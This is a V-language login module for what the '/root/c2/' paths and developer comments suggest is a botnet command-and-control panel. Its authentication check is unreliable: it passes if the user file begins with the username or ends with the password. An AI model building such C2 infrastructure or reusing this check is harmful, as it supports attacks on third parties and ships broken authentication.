module commands

import os
import time
import term
import net
import io
import utils

 pub fn login(mut conn net.TcpConn){
          mut u := utils.CLI{}
        // what are you even editing lol the login i wanna add ban system. this is ur net or wocky?mine i just used the title thing fromm wocky
          mut c_s := utils.Wocky_Settings{}
          u.set_title2(mut conn, "Login")
          u.resize_terminal(mut conn, 24, 80)
          conn.write_string("\033[1A\033[2J\033[1;1H") or {0}
          mut read := io.new_buffered_reader(reader: conn)
          conn.write_string("\r[38;2;255;222;173musername: ") or {0}
          username := read.read_line() or {return}
          conn.write_string("\r[38;2;255;222;173mpassword: ") or {0}
          password := read.read_line() or {return}
          db := os.read_file('/root/c2/db/users.db') or {return}
          if db.starts_with("+$username+") || db.ends_with("+$password+") {
          mut success := os.read_file('/root/c2/banner/sucess.txt') or {return}
          conn.write_string("\033[1A\033[2J\033[1;1H") or {0}
          conn.write_string(success) or {0}
          mut current_ip := conn.peer_addr() or { return } //User's IP
          println('$username logged in ip: $current_ip')
          conn.set_read_timeout(time.infinite)
          }else{
           failed := os.read_file('/root/c2/banner/notfound.txt') or {return}
           conn.write_string(failed) or {0}
           time.sleep(3 * time.second)
           conn.close() or {return}
          }
}
      pub fn get_db(mut conn net.TcpConn) string {
      return os.read_file('/root/c2/db/users.db') or { return '' }
    }